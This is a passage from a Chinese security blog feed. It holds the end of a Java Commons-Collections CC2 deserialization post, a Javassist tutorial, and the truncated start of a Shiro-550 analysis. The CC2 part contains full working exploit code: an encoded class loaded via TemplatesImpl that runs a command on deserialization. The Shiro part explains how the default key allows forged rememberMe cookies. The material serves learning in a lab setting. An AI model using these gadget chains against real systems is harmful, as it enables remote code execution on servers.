objectOutputStream.writeObject(queue);<br>        objectOutputStream.close();<br>        ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(byteArrayInputStream);<br>        objectInputStream.readObject();<br>        objectInputStream.close();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object object, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Class clazz = object.getClass();<br>        Field field = clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(object, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117013504158.png" alt="image-20211117013504158"></p><h2 id="改造升级PriorityQueue链"><a href="#改造升级PriorityQueue链" class="headerlink" title="改造升级PriorityQueue链"></a>改造升级PriorityQueue链</h2><p>这里准备按照管理尝试使用一下<code>TemplatesImpl</code>类加载字节码的方法执行命令,并且不使用数组的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplatesImplCC2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-keyword">byte</span>[] bytes = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAMQcAIwoAAQAkCgAHACQKACUAJggAJwoAJQAoBwApAQAJdHJhbnNmb3JtAQByKExj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcv&quot;</span> +<br>                <span class="hljs-string">&quot;YXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAE&quot;</span> +<br>                <span class="hljs-string">&quot;Q29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABVMb3Jn&quot;</span> +<br>                <span class="hljs-string">&quot;L2xjZG0xMjMvUnVuRXhlYzsBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4v&quot;</span> +<br>                <span class="hljs-string">&quot;aW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1s&quot;</span> +<br>                <span class="hljs-string">&quot;L2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcA&quot;</span> +<br>                <span class="hljs-string">&quot;KgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1&quot;</span> +<br>                <span class="hljs-string">&quot;bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29y&quot;</span> +<br>                <span class="hljs-string">&quot;Zy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYB&quot;</span> +<br>                <span class="hljs-string">&quot;AAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlz&quot;</span> +<br>                <span class="hljs-string">&quot;SXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3Nl&quot;</span> +<br>                <span class="hljs-string">&quot;cmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwcAKwEABjxpbml0PgEAAygpVgEAClNv&quot;</span> +<br>                <span class="hljs-string">&quot;dXJjZUZpbGUBAAxSdW5FeGVjLmphdmEBABNvcmcvbGNkbTEyMy9SdW5FeGVjDAAfACAHACwMAC0A&quot;</span> +<br>                <span class="hljs-string">&quot;LgEABGNhbGMMAC8AMAEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9y&quot;</span> +<br>                <span class="hljs-string">&quot;dW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQARamF2YS9s&quot;</span> +<br>                <span class="hljs-string">&quot;YW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEA&quot;</span> +<br>                <span class="hljs-string">&quot;JyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAEABwAAAAAABAABAAgA&quot;</span> +<br>                <span class="hljs-string">&quot;CQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAADgAMAAAAIAADAAAAAQANAA4AAAAAAAEA&quot;</span> +<br>                <span class="hljs-string">&quot;DwAQAAEAAAABABEAEgACABMAAAAEAAEAFAABAAgAFQACAAoAAABJAAAABAAAAAGxAAAAAgALAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;BgABAAAAEgAMAAAAKgAEAAAAAQANAA4AAAAAAAEADwAQAAEAAAABABYAFwACAAAAAQAYABkAAwAT&quot;</span> +<br>                <span class="hljs-string">&quot;AAAABAABABQACQAaABsAAgAKAAAANwACAAEAAAAJuwABWbcAAlexAAAAAgALAAAACgACAAAAFQAI&quot;</span> +<br>                <span class="hljs-string">&quot;ABYADAAAAAwAAQAAAAkAHAAdAAAAEwAAAAQAAQAeAAEAHwAgAAIACgAAAEAAAgABAAAADiq3AAO4&quot;</span> +<br>                <span class="hljs-string">&quot;AAQSBbYABlexAAAAAgALAAAADgADAAAAFwAEABgADQAZAAwAAAAMAAEAAAAOAA0ADgAAABMAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAEAHgABACEAAAACACI=&quot;</span>);<br>        TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>        setField(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setField(templates, <span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br><br>        Transformer fakeTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;toString&quot;</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>);<br>        Comparator comparator = <span class="hljs-keyword">new</span> TransformingComparator(fakeTransformer);<br>        PriorityQueue queque = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">3</span>,comparator);<br>        queque.add(templates);<br>        queque.add(templates);<br><br>        setField(fakeTransformer,<span class="hljs-string">&quot;iMethodName&quot;</span>,<span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream objectOutputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(byteArrayOutputStream);<br>        objectOutputStream.writeObject(queque);<br>        objectOutputStream.close();<br>        ByteArrayInputStream byteArrayInputStream = <span class="hljs-keyword">new</span> ByteArrayInputStream(byteArrayOutputStream.toByteArray());<br>        ObjectInputStream objectInputStream = <span class="hljs-keyword">new</span> ObjectInputStream(byteArrayInputStream);<br>        objectInputStream.readObject();<br>        objectInputStream.close();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setField</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Class clazz= obj.getClass();<br>        Field field= clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211117021304932.png" alt="image-20211117021304932"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对于<code>ProrityQueue</code>类的反序列化是不支持在 Commons-Collections3 中使用的，因为在 Commons-Collections4 之前这个类都没有实现反序列化接口。对于CC链的学习也告一段落了，接下来继续看看其他的东西，学无止境，充分利用好学习时间。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-CC2&quot;&gt;&lt;a href=&quot;#Java-CC2&quot; class=&quot;headerlink&quot; title=&quot;Java CC2&quot;&gt;&lt;/a&gt;Java CC2&lt;/h1&gt;&lt;p&gt;Apache Commons Collections 是一个著名的辅助开发库，里面包含了一些</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Javassist</title>
    <link href="http://example.com/2021/11/16/Javassist/"/>
    <id>http://example.com/2021/11/16/Javassist/</id>
    <published>2021-11-16T10:08:46.000Z</published>
    <updated>2021-11-16T10:09:51.265Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h1><blockquote><p>这个基本都是直接粘贴复制的，放在这里只是为了以后方便查看</p></blockquote><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.21.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="使用样例"><a href="#使用样例" class="headerlink" title="使用样例"></a>使用样例</h2><p>对于 Javassist 的概念我看了一大堆但是都没有理解，这里直接动手运行一下就稍微理解了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.lcdm123;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CreateClass</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, IOException </span>&#123;<br>        <span class="hljs-comment">// 获取javassist维护的类池</span><br>        ClassPool pool = ClassPool.getDefault();<br>        <span class="hljs-comment">// 创建一个空类</span><br>        CtClass ctClass = pool.makeClass(<span class="hljs-string">&quot;org.lcdm123.People&quot;</span>);<br>        <span class="hljs-comment">// 给类添加一个字段</span><br>        CtField namefield = <span class="hljs-keyword">new</span> CtField(pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, ctClass);<br>        <span class="hljs-comment">// 为 name 字段设置权限</span><br>        namefield.setModifiers(Modifier.PRIVATE);<br>        <span class="hljs-comment">// 初始化 name 字段</span><br>        ctClass.addField(namefield, CtField.Initializer.constant(<span class="hljs-string">&quot;lcdm123&quot;</span>));<br>        <span class="hljs-comment">// 生成 set get 方法</span><br>        ctClass.addMethod(CtNewMethod.getter(<span class="hljs-string">&quot;getName&quot;</span>, namefield));<br>        ctClass.addMethod(CtNewMethod.setter(<span class="hljs-string">&quot;setName&quot;</span>, namefield));<br>        <span class="hljs-comment">// 添加无参构造函数</span><br>        CtConstructor ctConstructor = <span class="hljs-keyword">new</span> CtConstructor(<span class="hljs-keyword">new</span> CtClass[]&#123;&#125;, ctClass);<br>        ctConstructor.setBody(<span class="hljs-string">&quot;&#123;name=\&quot;lcdm123\&quot;;&#125;&quot;</span>);<br>        ctClass.addConstructor(ctConstructor);<br>        <span class="hljs-comment">// 创建一个方法</span><br>        CtMethod printNamefield = <span class="hljs-keyword">new</span> CtMethod(CtClass.voidType, <span class="hljs-string">&quot;printName&quot;</span>, <span class="hljs-keyword">new</span> CtClass[]&#123;&#125;, ctClass);<br>        printNamefield.setModifiers(Modifier.PUBLIC);<br>        <span class="hljs-comment">// $0 表示 this，$1 表示传入的第一个参数</span><br>        printNamefield.setBody(<span class="hljs-string">&quot;&#123;System.out.println($0.name);&#125;&quot;</span>);<br>        ctClass.addMethod(printNamefield);<br>        <span class="hljs-comment">// 写入 class 文件</span><br>        ctClass.writeFile();<br>        <span class="hljs-comment">// 释放内存</span><br>        ctClass.detach();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>直接运行就会生成<code>People.class</code>文件</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211113221914703.png" alt="image-20211113221914703"></p><p>直接利用 javassist 构造了一个class文件，这样就可以不用重新写一个类来构建生成class 文件了</p><h2 id="重要的方法"><a href="#重要的方法" class="headerlink" title="重要的方法"></a>重要的方法</h2><p>ClassPool重点有以下几个方法：</p><p>getDefault() 单例获取ClassPool<br>appendClassPath() 将目录添加到ClassPath<br>insertClassPath() 在ClassPath插入jar<br>get() 根据名称获取CtClass对象<br>toClass() 将CtClass转为Class 一旦被转换则不能修改<br>makeClass() 创建新的类或接口<br>更多移步官方文档：<a href="http://www.javassist.org/html/javassist/ClassPool.html">http://www.javassist.org/html/javassist/ClassPool.html</a></p><p>CtClass需要关注的方法：</p><p>addConstructor() 添加构造函数<br>addField() 添加字段<br>addInterface() 添加接口<br>addMethod() 添加方法<br>freeze() 冻结类使其不能被修改<br>defrost() 解冻使其能被修改<br>detach() 从ClassPool中删除类<br>toBytecode() 转字节码<br>toClass() 转Class对象<br>writeFile() 写入.class文件<br>setModifiers() 设置修饰符<br>移步：<a href="http://www.javassist.org/html/javassist/CtClass.html">http://www.javassist.org/html/javassist/CtClass.html</a></p><p>CtMethod继承CtBehavior，需要关注的方法：</p><p>insertBefore 在方法的起始位置插入代码<br>insterAfter 在方法的所有 return 语句前插入代码<br>insertAt 在指定的位置插入代码<br>setBody 将方法的内容设置为要写入的代码，当方法被 abstract修饰时，该修饰符被移除<br>make 创建一个新的方法<br>更多移步：<a href="http://www.javassist.org/html/javassist/CtBehavior.html">http://www.javassist.org/html/javassist/CtBehavior.html</a></p><h2 id="使用-CtClass-生成对象"><a href="#使用-CtClass-生成对象" class="headerlink" title="使用 CtClass 生成对象"></a>使用 CtClass 生成对象</h2><p>上面生成的 ctClass 对象对应的是 Person.class，我们有三种方法调用 Person 类</p><h3 id="反射调用"><a href="#反射调用" class="headerlink" title="反射调用"></a>反射调用</h3><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">Object o = ctClass.<span class="hljs-keyword">to</span><span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;<br>Method setName = o.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;setName&quot;</span>, String.<span class="hljs-params">class</span>)</span>;<br>setName.invoke(o,<span class="hljs-string">&quot;lcdm123&quot;</span>);<br>Method printName1 = o.get<span class="hljs-constructor">Class()</span>.get<span class="hljs-constructor">Method(<span class="hljs-string">&quot;printName&quot;</span>)</span>;<br>printName1.invoke(o);<br></code></pre></td></tr></table></figure><h3 id="加载-Class-文件"><a href="#加载-Class-文件" class="headerlink" title="加载 Class 文件"></a>加载 Class 文件</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">ClassPool pool = ClassPool.getDefault();<br>pool.appendClassPath(<span class="hljs-string">&quot;E:\\code\\java\\javassist\\org\\lcdm123&quot;</span>);<br>CtClass PersonClass = pool.get(<span class="hljs-string">&quot;org.lcdm123.Person&quot;</span>);<br>Object o = PersonClass.toClass().newInstance();<br></code></pre></td></tr></table></figure><h3 id="通过接口调用"><a href="#通过接口调用" class="headerlink" title="通过接口调用"></a>通过接口调用</h3><p>新建一个接口将Person类的方法都抽象出来</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">package org.lcdm123;<br><br>public<span class="hljs-built_in"> interface </span>IPerson &#123;<br>    String getName();<br><br>    void setName(String name);<br><br>    void printName();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">ClassPool pool = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassPool</span>.</span></span>get<span class="hljs-constructor">Default()</span>;<br>pool.append<span class="hljs-constructor">ClassPath(<span class="hljs-string">&quot;E:\\code\\java\\javassist\\org\\lcdm123\\Person.class&quot;</span>)</span>;<br>CtClass IPerson = pool.get(<span class="hljs-string">&quot;org.lcdm123.IPerson&quot;</span>);<br>CtClass Person = pool.get(<span class="hljs-string">&quot;org.lcdm123.Person&quot;</span>);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Person</span>.</span></span>defrost<span class="hljs-literal">()</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Person</span>.</span></span>set<span class="hljs-constructor">Interfaces(<span class="hljs-params">new</span> CtClass[]&#123;IPerson&#125;)</span>;<br><br>IPerson o = (IPerson) <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Person</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">Class()</span>.<span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;<br>o.set<span class="hljs-constructor">Name(<span class="hljs-string">&quot;lcdm&quot;</span>)</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(o.get<span class="hljs-constructor">Name()</span>);<br>o.print<span class="hljs-constructor">Name()</span>;<br></code></pre></td></tr></table></figure><p>将Person类实现IPerson接口，然后创建实例时直接强转类型，就可以直接调用了。</p><h2 id="修改现有类"><a href="#修改现有类" class="headerlink" title="修改现有类"></a>修改现有类</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">pool.appendClassPath(<span class="hljs-string">&quot;E:\\code\\java\\javassist\\org\\lcdm123\\Person.class&quot;</span>);<br>CtClass Person = pool.get(<span class="hljs-string">&quot;org.lcdm123.Person&quot;</span>);<br>Person.defrost();<br><br>CtMethod printName1 = Person.getDeclaredMethod(<span class="hljs-string">&quot;printName&quot;</span>, <span class="hljs-keyword">null</span>);<br>printName1.insertBefore(<span class="hljs-string">&quot;System.out.println(\&quot;------ printName start ------\&quot;);&quot;</span>);<br>printName1.insertAfter(<span class="hljs-string">&quot;System.out.println(\&quot;------ printName  over ------\&quot;);&quot;</span>);<br><br>Object o = Person.toClass().newInstance();<br>Method printName2 = o.getClass().getMethod(<span class="hljs-string">&quot;printName&quot;</span>);<br>printName2.invoke(o, <span class="hljs-keyword">null</span>);<br></code></pre></td></tr></table></figure><p>参考文章</p><p><a href="https://y4er.com/post/javassist-learn/">https://y4er.com/post/javassist-learn/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Javassist&quot;&gt;&lt;a href=&quot;#Javassist&quot; class=&quot;headerlink&quot; title=&quot;Javassist&quot;&gt;&lt;/a&gt;Javassist&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;这个基本都是直接粘贴复制的，放在这里只是为了以后方便查看&lt;</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Shiro 550 反序列化(一)</title>
    <link href="http://example.com/2021/11/16/Shiro-550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%B8%80/"/>
    <id>http://example.com/2021/11/16/Shiro-550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%B8%80/</id>
    <published>2021-11-15T16:28:34.000Z</published>
    <updated>2021-11-16T10:06:48.851Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Shiro-550-反序列化漏洞"><a href="#Shiro-550-反序列化漏洞" class="headerlink" title="Shiro 550 反序列化漏洞"></a>Shiro 550 反序列化漏洞</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前两天跟着P神的文章学习了部分CC链，看多少忘多少…………（实在是太菜了），之后先跟着学习边学边复习吧。今天轮到了 shiro 反序列化，刚好再比赛中遇到了，但是我直接是靠工具怼的，属实是太菜了，所以这里简单学习一下原理。</p><h2 id="Shiro"><a href="#Shiro" class="headerlink" title="Shiro"></a>Shiro</h2><p>Apache Shiro 是一个java框架，执行身份验证，授权，密码和会话管理。为了让浏览器或服务器重启之后用户不丢失登录状态，Shiro 支持将持久化信息序列化并加密后保存再 Cookie 的 rememberMe 字段中，下次读取时就行解密再反序列化。再 1.2.4版本之前内置了一个默认且固定的加密 key，导致了攻击者可以伪造任意的 rememberMe Cookie 触发反序列化漏洞。</p><p>Shiro-550<code>(Apache  Shiro &lt; 1.2.5)</code><strong>和Shiro-721</strong><code>( Apache  Shiro &lt; 1.4.2 )</code><strong>。这两个漏洞主要区别在于Shiro550使用已知密钥撞，后者Shiro721是使用</strong><code>登录后rememberMe=&#123;value&#125;去爆破正确的key值</code>进而反序列化，对比Shiro550条件只要有<code>足够密钥库</code>（条件比较低）、Shiro721需要登录（要求比较高）。</p><p>攻击流程：</p><p><code>得到rememberMe的Cookie值 -&gt; Base64解码 -&gt; AES解密 -&gt; 反序列化</code></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>直接利用 IDEA 来搭建一个Tomcat环境并且运行起来，具体步骤可以直接去网上找</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211114230106404.png" alt="image-20211114230106404"></p><blockquote><p>这里利用的是P神的 shiroDemo</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211114230507402.png" alt="image-20211114230507402"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在<code>org.apache.shiro.mgt.AbstractRememberMeManager</code>中找到默认的密钥</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211114230954499.png" alt="image-20211114230954499"></p><p>payload的攻击流程就是<code>payload-&gt;AES加密-&gt;Base64加密</code></p><blockquote><p>先自己写一下CC6的链，然后再加密</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 